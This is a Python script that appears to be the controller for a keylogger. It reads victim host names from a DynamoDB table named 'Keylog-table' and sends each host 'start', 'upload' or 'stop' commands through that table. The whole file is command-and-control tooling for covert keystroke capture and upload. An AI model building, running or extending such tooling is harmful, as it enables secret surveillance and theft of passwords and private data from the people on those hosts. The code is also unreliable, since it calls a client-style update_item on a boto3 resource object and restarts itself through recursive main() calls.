import boto3
import os
from boto3.dynamodb.conditions import Key
from dotenv import load_dotenv


def main():

    load_dotenv()

    dynamodb = boto3.resource('dynamodb')

    items = pull_items(dynamodb)

    host_names = [item.get('hostName') for item in items if 'hostName' in item]

    print('Host(s) available:')

    for name in host_names:
        print(f'{name}')

    print('\n')

    host_name = input('Select host(s): ')

    host_names_lowercase = [item.lower() for item in host_names]

    while True:
        if host_name.lower() in host_names_lowercase:
            break
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Host not available\n")
            main()

    select_cmds(host_name, dynamodb)
    os.system('cls' if os.name == 'nt' else 'clear')
    

def update_cmds(host_name, cmd, dynamodb):
    dynamodb.update_item(
        TableName='Keylog-table',
        Key={'hostName': {'S': host_name}},
        UpdateExpression='SET curr_cmd = :cmd',
        ExpressionAttributeValues={':cmd': {'S': cmd}}
    )

def pull_items(dynamodb):
    table = dynamodb.Table('Keylog-table')

    response = table.scan()
    items = response.get('Items', [])

    return items

def select_cmds(host_name, dynamodb):
    while True:
        print(f"Currently on host: {host_name}")
        cmd = input('Enter cmd: Start | Upload | Stop | Reselect = ').strip().lower()
        
        if cmd == 'start':
            update_cmds(host_name, cmd, dynamodb)
        elif cmd == 'upload':
            update_cmds(host_name, cmd, dynamodb)
        elif cmd == 'stop':
            update_cmds(host_name, cmd, dynamodb)
        elif cmd == 'reselect':
            main()
        else:
            print('Misinput')

if __name__ == '__main__':
    main()